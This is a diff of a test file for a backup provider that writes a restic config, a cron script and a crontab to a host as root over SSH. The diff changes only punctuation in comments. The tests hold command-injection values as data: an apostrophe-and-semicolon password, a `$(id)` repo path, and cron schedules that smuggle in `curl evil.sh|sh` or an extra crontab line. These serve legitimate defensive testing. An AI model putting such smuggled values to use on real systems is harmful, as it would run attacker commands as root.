@@ -137,7 +137,7 @@ test("apply writes a chmod-600 once-guarded restic.env, the script + crontab, an
 });
 
 /* This provider writes a file, a shell script and a crontab on a host, over SSH, as root, from values an
- * operator typed into an intent file — so a quote in any of them is not a formatting bug. Each case below is
+ * operator typed into an intent file, so a quote in any of them is not a formatting bug. Each case below is
  * one of the three parsers that used to receive an unescaped value. */
 
 test("an apostrophe in a restic password stays inside the value instead of ending the shell quoting", async () => {
@@ -147,7 +147,7 @@ test("an apostrophe in a restic password stays inside the value instead of endin
     await createBackupProvider(ssh.executor).apply({ ...inputs, password: `don't; id` }, undefined, ctx());
     const write = ssh.commands.find((c) => c.includes("restic.env")) ?? "";
     // Asserted through a real shell rather than by transcribing the escape: run the emitted printf and compare
-    // the bytes it would have written. This is the only assertion that covers BOTH layers at once — that the
+    // the bytes it would have written. This is the only assertion that covers BOTH layers at once: that the
     // host shell hands printf one argument per line, and that the line is what restic will read back.
     const printf = write.slice(write.indexOf("printf"), write.indexOf(" > "));
     const written = execFileSync("sh", ["-c", printf], { encoding: "utf8" });
@@ -156,7 +156,7 @@ test("an apostrophe in a restic password stays inside the value instead of endin
 
 test("a command substitution in the repo is inert in the cron script it gets baked into", async () => {
     const ssh = fakeSsh();
-    // The heredoc is quoted so the HOST shell leaves it alone — but the script's own `restic -r "$repo"` was
+    // The heredoc is quoted so the HOST shell leaves it alone, but the script's own `restic -r "$repo"` was
     // double-quoted, and a double-quoted $(…) runs. On this host that is root, every tick, forever.
     await createBackupProvider(ssh.executor).apply({ ...inputs, repo: `/srv/$(id)` }, undefined, ctx());
     const script = ssh.commands.find((c) => c.includes("backup.sh"));
@@ -167,7 +167,7 @@ test("a command substitution in the repo is inert in the cron script it gets bak
 test("a schedule is refused unless it is exactly five cron fields", () => {
     const provider = createBackupProvider(fakeSsh().executor);
     // A crontab cannot quote, so these are rejected rather than escaped. A sixth field IS the command, and a
-    // newline is a whole extra entry — both run as root on the operator's chosen schedule.
+    // newline is a whole extra entry: both run as root on the operator's chosen schedule.
     expect(() => provider.diff({ ...inputs, schedule: `0 3 * * * curl evil.sh|sh #` }, { outputs: {} })).toThrow(/five cron fields/);
     expect(() => provider.diff({ ...inputs, schedule: `0 3 * * *\n* * * * * id` }, { outputs: {} })).toThrow(/five cron fields/);
     expect(() => provider.diff({ ...inputs, schedule: `*/15 2-4 * * mon-fri` }, { outputs: {} })).not.toThrow();
